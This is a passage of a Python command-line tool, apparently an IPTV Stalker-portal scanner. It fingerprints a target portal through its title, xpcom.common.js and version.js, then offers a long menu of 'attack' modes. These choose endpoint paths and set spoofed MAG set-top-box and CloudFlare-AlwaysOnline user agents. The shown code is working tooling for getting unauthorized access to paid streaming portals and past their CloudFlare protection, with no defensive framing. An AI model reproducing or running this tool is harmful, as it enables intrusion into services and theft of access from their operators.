            print("\x1b[33m           Please wait... \x1b[0m")
    else:
        clear()
        print(Rimi)
        print(printxi)
        print(f"\n  {GREEN}╓This is the correct Sub-Portal {RESET}")
        print(f"  {GREEN}╙{MAGENTA}{http}://{panel} {RESET}")
        print(f"\n  {YELLOW}╓Trying to collect Portal DATA {RESET}")
        print("\x1b[33m           Please wait... \x1b[0m")
    try:
        phptitle = str(
            option.get(http + "://" + panels, headers=HEADERAc, timeout=2, verify=None)
            .text.split("<title>")[1]
            .split("<")[0]
            + "\n"
        )
        print(phptitle)
        if "cloudflare" in phptitle:
            ccff = "CloudFlare"
            phptit = "OKK"
        if "NXT" in phptitle:
            cc = "[NXT]"
            phptit = "NXT"
            phpdata2 = "c/portal.php"
        elif "stalker_portal" in phptitle or "stalker" in phptitle:
            phpdata2 = "server/load.php"
            cse = "\x1b[90m[Stalker_Portal] \x1b[0m"
            phptit = "Stalker"
        elif "portal" in phptitle or "Portal" in phptitle or "PORTAL" in phptitle:
            phpdata2 = "portal.php"
            cse = "\x1b[90m[Portal] \x1b[0m"
            phptit = "Portal"
        elif "Loading..." in phptitle:
            phptit = "Loading..."
            phpdata2 = "server/load.php"
        elif "Access denied" in phptitle:
            cse = "\x1b[91m[Access Denied] \x1b[0m"
            phptit = ""
        elif "server is down" in phptitle:
            down = "\x1b[91m[Portal DOWN] \x1b[0m"
            phptit = ""
        elif (
            "<!DOCTYPEHTMLPUBLIC" in phptitle
            or (
                "403Forbidden" in phptitle
                or (
                    "404 Not Found" in phptitle
                    or ("404NotFound" in phptitle or "!DOCTYPE" in phptitle)
                )
            )
            or phptitle == ""
        ):
            down = "\x1b[91m[Blocked-IP] \x1b[0m"
            phptit = ""
        else:
            try:
                connection = option.get(http + "://" + panel, timeout=2)
            except:
                pass
            if connection.status_code == 200:
                phptit = "OKK"
            else:
                phptit = ""
        phpdata = str(
            option.get(
                http + "://" + panels + "xpcom.common.js", headers=HEADERAc, timeout=4, verify=None
            ).text.replace(" ", "")
        )
        if "this.user" not in phpdata and "/" not in panel:
            panels = f"{panel}/stalker_portal/c/"
            panel = f"{panel}/stalker_portal"
            try:
                phpdata = str(
                    option.get(
                        http + "://" + panels + "xpcom.common.js",
                        headers=HEADERAc,
                        timeout=4,
                        verify=None,
                    ).text.replace(" ", "")
                )
                if "this.user" not in phpdata:
                    phpdata = ""
                    panel = BASE_Panel
                    panels = f"{BASE_Panel}/c/"
            except:
                pass
        phpd = phpdata
        if "+this.portal_ip+'/" in phpdata:
            phpdata = phpdata.split("portal_ip+'/")[1].split("';")[0]
            if "+this.portal_path+'" in phpdata:
                phpdata = phpdata.split("+'/")[1].split("';")[0]
        elif "+this.portal_path+'" in phpd:
            phpdata = phpdata.split("+'/")[1].split("';")[0]
        elif "portal.php" in phpd and phptit == "NXT":
            phpdata = "c/portal.php"
        elif "portal.php" in phpd and phptit == "Portal":
            phpdata = "portal.php"
        elif "server/load.php" in phpd and phptit == "NXT":
            phpdata = "c/server/load.php"
        elif "stalker_portal" in phpd or phptit == "Stalker":
            phpdata = "server/load.php"
        elif "c/server/load.php" in phpd:
            phpdata = "c/server/load.php"
        elif stalker_ == "" and phptit == "Stalker":
            phpdata = "stalker_portal/server/load.php"
        else:
            phpdata = ""
        if "cloudflare" in phpd or ccff == "CloudFlare":
            cf = "\x1b[91m[CloudFlare] \x1b[0m"
        if not cse == "" or (not cf == "" or not cc == "") or not down == "":
            info = "\x1b[90m╙" + str(cse + cc + cf + down)
            infophp = str(cse + cc + cf + down)
        phpdata = phpdata.replace(" ", "")
        vrdata = str(
            option.get(
                http + "://" + panels + "version.js", headers=HEADERAc, timeout=2, verify=None
            ).text.replace(" ", "")
        )
        if "ver='" in vrdata:
            vrdata = vrdata.replace("\n", "")
            vrdata = vrdata.split("'")[1].split("'")[0]
            vrdata = vrdata.replace(" ", "")
            vrdataC = f" {YELLOW}| {MAGENTA}v{vrdata}"
        else:
            vrdata = "5.6.6"
            vrdataC = f" {YELLOW}| {MAGENTA}v{vrdata}"
    except:
        pass
    Automatic = ""
    if "stalker_portal" in panel:
        if phpdata == "portal.php":
            phpdata = "server/load.php"
        if phpdata == "c/portal.php":
            phpdata = "c/server/load.php"
    if phpdata == "portal.php" and phptit == "Stalker":
        phpdata = "server/load.php"
    if phptit == "Portal" and "XUI" in vrdata:
        phpdata = f"c/{phpdata}"
    if cc == "[NXT]":
        phpdata = f"c/{phpdata}"
    if phpdata == "":
        if phpX == "PHP":
            phpdata = "portal.php"
        if not phpdata2 == "":
            phpdata = str(phpdata2)
    if vrdata == "" or vrdata == " ":
        vrdata = "5.6.6"
        vrdataC = f" {YELLOW}| {MAGENTA}v{vrdata}"
    clear()
    print(Rimi)
    panel = panel.replace("/c/", "")
    print(printxi)
    print(f"\n  {GREEN}╓This is the correct Sub-Portal {RESET}")
    print(f"  {GREEN}╙{MAGENTA}{http}://{panel} {RESET}")
    print(f"\n  {YELLOW}╓Trying to collect Portal DATA {RESET}")
    print(phpdata)
    print(phptit)
    if not phpdata == "" or not phptit == "":
        Automatic = "ON"
        if phpdata == "":
            print(f"  {YELLOW}╓{GREEN}SUCCESS➛ Portal Data Collected! {RESET}")
        else:
            print(f"  {YELLOW}╠[{MAGENTA} {phpdata}{vrdataC} {YELLOW}]{RESET}")
            print(f"  {YELLOW}╙{GREEN}SUCCESS➛ Portal Data Collected! {RESET}")
        if HTTPFAIL == "FAILED":
            HTTPFAIL = "FAILED2"
        phhp = input(
            """[96m
   [33m1 = Aᴜᴛᴏᴍᴀᴛɪᴄ•sᴛʙᴍᴀx=[32m[ON] [32m
       """
            + str(info)
            + """ [0m
   [96m2 = Cᴏɴᴛɪɴᴜᴇ ᴡɪᴛʜ ᴍᴀɴᴜᴀʟ-ᴘʜᴘ [0m

   [40mAɴsᴡᴇʀ = [0m[31m[31m"""
        )
    else:
        if not phpX == "PHP":
            panel = BASE_Panel
        Automatic = "OFF"
        tags2 = ["https://", "http://", "/c/", " "]
        for tag in tags2:
            panel = panel.replace(tag, "")
        if phpdata == "":
            print(f"  {YELLOW}╙{REDa}FAILED➛ Collecting Portal DATA! {RESET}")
        else:
            print(f"  {YELLOW}╠[{GREYa} {phpdata}{vrdataC} {YELLOW}]{RESET}")
            print(f"  {YELLOW}╙{REDa}FAILED➛ Collecting Portal DATA! {RESET}")
        if HTTPFAIL == "FAILED":
            HTTPFAIL = "FAILED2"
        phhp = input(
            """[96m
   [90m1 = Aᴜᴛᴏᴍᴀᴛɪᴄ•sᴛʙᴍᴀx=[OFF]
       """
            + str(info)
            + """ [0m
   [96m2 = Cᴏɴᴛɪɴᴜᴇ ᴡɪᴛʜ ᴍᴀɴᴜᴀʟ-ᴘʜᴘ [0m

   [40mAɴsᴡᴇʀ = [0m[31m[31m"""
        )
if HTTPFAIL == "FAILED2":
    clear()
    print(Rimi)
    xhttpx = input(
        """[0;1m   Automatic Protocol check has FAILED!
     So, select manual Portal Protocol! [0m
   
   [31mMost of portals use the \"HTTP\", but
   some portals are \"HTTPS\" protocols. [0m
   
   [33mᴅᴇғᴀᴜʟᴛ ɪs = 1 [0m
[36m
   1 - HTTP
   2 - HTTPS
[0m
[31m   Aɴsᴡᴇʀ = [0m[0m[0m"""
    )
    if xhttpx == "2":
        http = "https"
    else:
        http = "http"
if phhp == "":
    print(
        """
[0mWrong: PHP cannot be empty, 1 or 2!"""
    )
    quit()
if phhp == "1":
    phhp = "99"
else:
    clear()
    print("\x1b[0m")
    phhp = ""
    phhp = input(
        """
     0 [1;32m=⫸ [0m [33mᴀᴅᴅ-ᴄᴜsᴛᴏᴍ.ᴘʜᴘ [0m
     1 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴼᴸᴰ⁾ [0m
     2 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴬᵗᵗᵃᶜᵏ⁾ [0m
     3 [1;32m=⫸ [0m [33m[ᴄ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᶜˡᵒᵘᵈ⁾ [0m
     4 [1;32m=⫸ [0m [33m[x]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᴷᶜ⁾ [0m
     5 [1;32m=⫸ [0m [33m[ʀ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴬᵀᴼᴹ⁾ [0m
     6 [1;32m=⫸ [0m [33m[ᴜʟ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᵁᴸᵀᴿᴬ⁾ [0m
     7 [1;32m=⫸ [0m [33m[xɢ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴳᴼᴸᴰ⁾ [0m
     8 [1;32m=⫸ [0m [33m[ɴxᴛ]ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴳᴴᴼˢᵀ⁾ [0m
     9 [1;32m=⫸ [0m [33msᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴼᴸᴰ⁾ [0m
    10 [1;32m=⫸ [0m [33msᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴬᵗᵗᵃᶜᵏ⁾ [0m
    11 [1;32m=⫸ [0m [33m[x]sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᴷᶜ²⁾ [0m
    12 [1;32m=⫸ [0m [33m[ᴄ]sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᶜˡᵒᵘᵈ⁾ [0m
    13 [1;32m=⫸ [0m [33m[ʀ]sᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴬᵀᴼᴹ⁾ [0m
    14 [1;32m=⫸ [0m [33m[s]sᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴳᴴᴼˢᵀ⁾ [0m
    15 [1;32m=⫸ [0m [33m[xɢ]sᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴳᴼᴸᴰ⁾ [0m
    16 [1;32m=⫸ [0m [33m[ᴜʟ]sᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᵁᴸᵀᴿᴬ⁾ [0m
    17 [1;32m=⫸ [0m [33msᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ➚⁽ˢˢ⁾ [0m
    18 [1;32m=⫸ [0m [33m[ɴxᴛ]ᴄ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    19 [1;32m=⫸ [0m [33m[ɴxᴛ]ᴄ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᵁᴸ-ˣᵁᴵ³⁾ [0m
    20 [1;32m=⫸ [0m [33m[ʀ]ᴄ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾ [0m
    21 [1;32m=⫸ [0m [33m[s]ᴄ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˢˢ-ˣᵁᴵ³⁾ [0m
    22 [1;32m=⫸ [0m [33mᴋ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    23 [1;32m=⫸ [0m [33mᴘ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    24 [1;32m=⫸ [0m [33mᴄᴘ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    25 [1;32m=⫸ [0m [33mʀᴍxᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    26 [1;32m=⫸ [0m [33mᴄᴍᴅғᴏʀᴇx.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    27 [1;32m=⫸ [0m [33mᴇᴅɢᴇ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    28 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟᴄᴄ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾[0m
    29 [1;32m=⫸ [0m [33mᴍᴀɢʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    30 [1;32m=⫸ [0m [33mᴍᴀɢʟᴏᴀᴅ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴱˣᵀ⁾ [0m
    31 [1;32m=⫸ [0m [33mᴍᴀɢʟᴏᴀᴅ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    32 [1;32m=⫸ [0m [33mᴍᴀɢʟᴏᴠᴇ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    33 [1;32m=⫸ [0m [33mᴘᴏᴛᴀʟsᴛʙ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    34 [1;32m=⫸ [0m [33mᴘᴏᴛᴀʟsᴛʙ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    35 [1;32m=⫸ [0m [33mᴄʟɪᴇɴᴛ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    36 [1;32m=⫸ [0m [33mᴍᴀɢᴘᴏʀᴛᴀʟ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    37 [1;32m=⫸ [0m [33mᴍᴀɢᴀᴄᴄᴇss/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    38 [1;32m=⫸ [0m [33mᴘᴏᴡᴇʀғᴜʟʟ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    39 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟᴍᴇɢᴀ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    40 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟᴍᴇɢᴀ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    41 [1;32m=⫸ [0m [33mᴘᴏʀᴛᴀʟᴍᴇɢᴀ/ᴘᴏʀᴛᴀʟᴍᴇɢᴀ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    42 [1;32m=⫸ [0m [33mᴍɪɴɪsᴛʀᴀ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾ [0m
    43 [1;32m=⫸ [0m [33mᴍɪɴɪsᴛʀᴀ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    44 [1;32m=⫸ [0m [33mᴋᴏʀɪsɴɪᴄɪ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    45 [1;32m=⫸ [0m [33mɢʜᴀɴᴅɪ_ᴘᴏʀᴛᴀʟ/sᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾[0m
    46 [1;32m=⫸ [0m [33mʙʟᴏᴡᴘᴏʀᴛᴀʟ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    47 [1;32m=⫸ [0m [33mᴇᴍᴜ2/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    48 [1;32m=⫸ [0m [33mᴇᴍᴜ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    49 [1;32m=⫸ [0m [33mᴇxᴛʀᴀᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    50 [1;32m=⫸ [0m [33mᴛᴇᴋ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    51 [1;32m=⫸ [0m [33mʟɪɴᴋ_ᴏᴋ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    52 [1;32m=⫸ [0m [33mʟɪɴᴋ_ᴏᴋ.ᴘʜᴘ➚⁽ˣᵁᴵ³⁾ [0m
    53 [1;32m=⫸ [0m [33mʙs.ᴍᴀɢ.ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    54 [1;32m=⫸ [0m [33mʙSᴛʀᴇᴀᴍ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    55 [1;32m=⫸ [0m [33mʙSᴛʀᴇᴀᴍ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    56 [1;32m=⫸ [0m [33mʙSᴛʀᴇᴀᴍ/ʙs.ᴍᴀɢ.ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ˣᵁᴵ⁾ [0m
    57 [1;32m=⫸ [0m [33mᴅᴇʟᴋᴏ/sᴇʀᴠᴇʀ/ʟᴏᴀᴅ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    58 [1;32m=⫸ [0m [33mᴅᴇʟᴋᴏ/ᴘᴏʀᴛᴀʟ.ᴘʜᴘ➚⁽ᴺᴼᴿ⁾ [0m
    59 [1;32m=⫸ [0m [33m[s]sᴛᴀʟᴋᴇ.ᴘʜᴘ➚⁽ᴿ-ˣᵁᴵ³⁾ [0m
    60 [1;32m=⫸ [0m [33m[s]775GGʙsᴢʏ.ᴘʜᴘ➚⁽ˢˢ⁾ [0m
    61 [1;32m=⫸ [0m [33mᴘʟᴀʏ/ɪɴᴛᴇɢʀᴀᴛɪᴏɴ/sᴛᴀʟᴋᴇʀ➚⁽ᴺ⁾ [0m
    62 [1;32m=⫸ [0m [33mʀᴇᴀʟʙʟᴜᴇ.ᴘʜᴘ➚⁽ᴿᵉᵃˡᴮˡᵘᵉ⁾ [0m
    
    [40mAɴsᴡᴇʀ = [0m[31m[31m[31m"""
    )
    print(" \x1b[0m")
    if phhp == "":
        print(
            """
[0mWrong: PHP cannot be empty, 1 or 2!"""
        )
        quit()
    if phhp == "0":
        author = input(" Write custom .php = \x1b[0m")
        albstb2 = "/" + author.replace("/portal", "").replace(".php", "") + "➚⁽ᶜᵘˢᵗᵒᵐ⁾"
        albstb3 = "automatic.php➚⁽ᶜᵘˢᵗᵒᵐ⁾"
        authorz = "atack"
        pano = ""
        print(" " + author + "\n")
    if phhp == "1":
        clear()
        author = "portal.php"
        albstb2 = "➚⁽ᴼᴸᴰ⁾"
        authorz = "atack"
        albstb3 = "portal.php⁽ᴼᴸᴰ⁾"
        agentx = "Mᴀɢ200-ᴠ2Rᴇᴠ:250"
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    if phhp == "2":
        clear()
        author = "portal.php"
        albstb2 = "➚⁽ᴬᵗᵗᵃᶜᵏ⁾"
        albstb3 = "portal.php⁽ᴬᵗᵗᵃᶜᵏ⁾"
        authorc = "stbpro"
        authorz = "atack"
    if phhp == "3":
        clear()
        author = "portal.php"
        albstb2 = "➚⁽ᶜˡᵒᵘᵈ⁾"
        authorc = "cloudflarex"
        albstb3 = "automatic.php⁽ᶜˡᵒᵘᵈ⁾"
        attack = "CʟᴏᴜᴅFʟᴀʀᴇ-Pᴀss"
        agentx = "CʟᴏᴜᴅFʟᴀʀᴇ-Aɢᴇɴᴛ"
        authorz = "automatic"
        useragent = "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34"
    if phhp == "4":
        clear()
        author = "portal.php"
        albstb2 = "➚⁽ˣᴷᶜ⁾"
        authorz = "atack"
        albstb3 = "portal.php⁽ˣᴷᶜ⁾"
        agentx = "MᴀɢX-v2-533"
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    if phhp == "5":
        clear()
        author = "portal.php"
        authorc = "realblue"
        albstb2 = "➚⁽ᴬᵀᴼᴹ⁾"
        albstb3 = "portal.php⁽ᴬᵀᴼᴹ⁾"
        authorz = "atack"
    if phhp == "6":
        clear()
        author = "portal.php"
        authorc = "ultra"
        albstb2 = "➚⁽ᵁᴸᵀᴿᴬ⁾"
        albstb3 = "portal.php⁽ᵁᴸᵀᴿᴬ⁾"
        authorz = "atack"
    if phhp == "7":
        clear()
        author = "portal.php"
        authorc = "xgold"
        albstb2 = "➚⁽ᴳᴼᴸᴰ⁾"
        albstb3 = "portal.php⁽ᴳᴼᴸᴰ⁾"
        authorz = "atack"
    if phhp == "8":
        clear()
        author = "portal.php"
        albstb2 = "➚⁽ᴳᴴᴼˢᵀ⁾"
        authorc = "stalker_ss"
        albstb3 = "portal.php⁽ᴳᴴᴼˢᵀ⁾"
        authorz = "atack"
    if phhp == "9":
        clear()
        author = "server/load.php"
        albstb2 = "➚⁽ᴼᴸᴰ²⁾"
        albstb3 = "stalker_portal.php⁽ᴼᴸᴰ⁾"
        authorz = "atack"
        agentx = "Mᴀɢ200-ᴠ2Rᴇᴠ:250"
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    if phhp == "10":
        clear()
        author = "server/load.php"
        albstb3 = "stalker.php⁽ᴬᵗᵗᵃᶜᵏ⁾"
        albstb2 = "➚⁽ᴬᵗᵗᵃᶜᵏ⁾"
        authorc = "stbpro"
        authorz = "atack"
    if phhp == "11":
        clear()
        author = "server/load.php"
        albstb2 = "➚⁽ˣᴷᶜ²⁾"
        authorz = "atack"
        albstb3 = "stalker.php⁽ˣᴷᶜ⁾"
        agentx = "MᴀɢX-4-533"
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 4 rev: 1812 Mobile Safari/533.3"
    if phhp == "12":
        clear()
        author = "server/load.php"
        albstb2 = "➚⁽ᶜˡᵒᵘᵈ²⁾"
        pano = "/stalker_portal"
        authorz = "automatic"
        authorc = "cloudflarex"
        albstb3 = "automatic.php⁽ᶜˡᵒᵘᵈ⁾"
        attack = "CʟᴏᴜᴅFʟᴀʀᴇ-Pᴀss"
        agentx = "CʟᴏᴜᴅFʟᴀʀᴇ-Aɢᴇɴᴛ"
        useragent = "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34"
    if phhp == "13":
        clear()
        author = "server/load.php"
        authorc = "realblue"
        albstb2 = "➚⁽ᴬᵀᴼᴹ²⁾"
        albstb3 = "stalker.php⁽ᴬᵀᴼᴹ⁾"
        authorz = "atack"
    if phhp == "14":
        clear()
        author = "server/load.php"
        albstb2 = "➚⁽ᴳᴴᴼˢᵀ²⁾"
        authorc = "stalker_portal"
        albstb3 = "stalker.php⁽ᴳᴴᴼˢᵀ⁾"
        authorz = "atack"
    if phhp == "15":
        clear()
        author = "server/load.php"
        authorc = "stalker_portal_1"
        albstb2 = "➚⁽ᴳᴼᴸᴰ²⁾"
        albstb3 = "stalker.php⁽ᴳᴼᴸᴰ⁾"
        authorz = "atack"
    if phhp == "16":
        clear()
        author = "server/load.php"
        albstb2 = "➚⁽ᵁᴸᵀᴿᴬ²⁾"
        albstb3 = "stalker.php⁽ᵁᴸᵀᴿᴬ⁾"
        authorc = "ultra"
        authorz = "atack"
    if phhp == "17":
        clear()
        author = "stalker_portal/server/load.php"
        panel = panel.replace("stalker_portal", "")
        authorc = "realblue"
        albstb2 = "/stalker_portal➚⁽ˢˢ⁾"
        albstb3 = "stalker_portal.php⁽ˢˢ⁾"
        stbb = "/stalker_portal"
        ss = "/stalker_portal"
        pano = "/stalker_portal"
        authorz = "automatic"
        attack = "Sᴛᴀʟᴋᴇʀ-Aᴛᴛᴀᴄᴋ-SS"
        agentx = "Mᴀɢ266-ᴠ4Rᴇᴠ:533"
        useragent = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"
    if phhp == "18":
        clear()
        author = "c/portal.php"
        albstb3 = "portal.php⁽ˣᵁᴵ³⁾"
        albstb2 = "➚⁽ˣᵁᴵ³⁾"
        authorc = "stbpro"
        authorz = "atack"
    if phhp == "19":
        clear()
        author = "c/portal.php"
        albstb3 = "stalker.php⁽ᵁᴸ-ˣᵁᴵ³⁾"
        albstb2 = "➚⁽ᵁᴸᵀᴿᴬ-ˣᵁᴵ³⁾"
        authorc = "ultra"
        authorz = "atack"
    if phhp == "20":
        clear()
        author = "c/portal.php"
        albstb2 = "➚⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾"
        authorc = "realblue"
        albstb3 = "portal.php⁽ᴿᵉᵃˡ-ˣᵁᴵ³⁾"
        authorz = "atack"
    if phhp == "21":
        clear()
        author = "c/server/load.php"
        albstb2 = "➚⁽ˢˢ-ˣᵁᴵ³⁾"
        authorc = "stalker_ss"
        albstb3 = "stalker.php⁽ˢˢ-ˣᵁᴵ³⁾"
        authorz = "atack"
    if phhp == "22":
        clear()
        author = "k/portal.php"
        albstb2 = "/k➚⁽ˣᵁᴵ³⁾"
        albstb3 = "k/portal.php⁽ˣᵁᴵ³⁾"
        authorz = "atack"
        stbb = "/k/c/"
    if phhp == "23":
        clear()
        author = "p/portal.php"
        albstb2 = "/p➚⁽ˣᵁᴵ³⁾"
        albstb3 = "p/portal.php⁽ˣᵁᴵ³⁾"
        authorz = "atack"
        stbb = "/p/c/"
    if phhp == "24":
        clear()
        author = "cp/server/load.php"
        albstb2 = "/cp➚⁽ˣᵁᴵ³⁾"
        albstb3 = "cp/stalker.php⁽ˣᵁᴵ³⁾"
        authorz = "atack"
        stbb = "/cp/c/"
    if phhp == "25":
        clear()
        author = "rmxportal/portal.php"
        albstb2 = "/rmxportal➚⁽ˣᵁᴵ³⁾"
        albstb3 = "rmxportal.php⁽ˣᵁᴵ³⁾"
        pano = "/rmxportal"
        stbb = "/rmxportal"
        authorz = "atack"
    if phhp == "26":
        clear()
        author = "cmdforex/portal.php"
        albstb2 = "/cmdforex➚⁽ˣᵁᴵ³⁾"
        albstb3 = "cmdforex.php⁽ˣᵁᴵ³⁾"
        pano = "/cmdforex"
        stbb = "/cmdforex"
        authorz = "atack"
    if phhp == "27":
        clear()
        author = "edge.php"
        albstb2 = "/edge➚⁽ˣᵁᴵ³⁾"
        albstb3 = "edge.php⁽ˣᵁᴵ³⁾"
        authorz = "atack"
        pano = "/edge"
        stbb = "/edge"
    if phhp == "28":
        clear()
        author = "portalcc.php"
        albstb2 = "/portalcc➚⁽ˣᵁᴵ³⁾"
        albstb3 = "portalcc.php⁽ˣᵁᴵ³⁾"
        pano = "/portalcc"
        stbb = "/portalcc"
        authorz = "atack"
    if phhp == "29":
        clear()
        author = "magLoad.php"
        albstb2 = "/magLoad➚⁽ˣᵁᴵ³⁾"
        albstb3 = "magLoad.php⁽ˣᵁᴵ³⁾"
        pano = "/magLoad"
        stbb = "/magLoad"
        authorz = "atack"
    if phhp == "30":
        clear()
        author = "magLoad/magLoad.php"
        albstb2 = "/magLoad/Load➚⁽ᴱˣᵀ⁾"
        albstb3 = "magLoad.php⁽ᴱˣᵀ⁾"
        pano = "/magLoad"
        stbb = "/magLoad"
        authorz = "atack"
    if phhp == "31":
        clear()
        author = "magLoad/portal.php"
        albstb2 = "/magLoad➚⁽ᵁᴸᵀᴿᴬ⁾"
        albstb3 = "magLoad.php⁽ᵁᴸᵀᴿᴬ⁾"
        pano = "/magLoad"
        stbb = "/magLoad"
        authorz = "atack"
    if phhp == "32":
        clear()
        author = "maglove/portal.php"
        albstb2 = "/maglove➚⁽ˣᵁᴵ⁾"
        albstb3 = "maglove.php⁽ˣᵁᴵ⁾"
        pano = "/maglove"
        stbb = "/maglove"
        authorz = "atack"
    if phhp == "33":
        clear()
        author = "portalstb/portal.php"
        albstb2 = "/portalstb/p➚⁽ˣᵁᴵ⁾"
        albstb3 = "portalstb.php⁽ˣᵁᴵ⁾"
        pano = "/portalstb"
        stbb = "/portalstb"
        authorz = "atack"
    if phhp == "34":
        clear()
        author = "portalstb.php"
        albstb2 = "/portalstb➚⁽ˣᵁᴵ³⁾"
        albstb3 = "portalstb.php⁽ˣᵁᴵ³⁾"
        pano = "/portalstb"
        stbb = "/portalstb"
        authorz = "atack"
    if phhp == "35":
        clear()
        author = "client/portal.php"
        albstb2 = "/client➚⁽ˣᵁᴵ³⁾"
        albstb3 = "client.php⁽ˣᵁᴵ³⁾"
        pano = "/client"
        stbb = "/client"
        authorz = "atack"
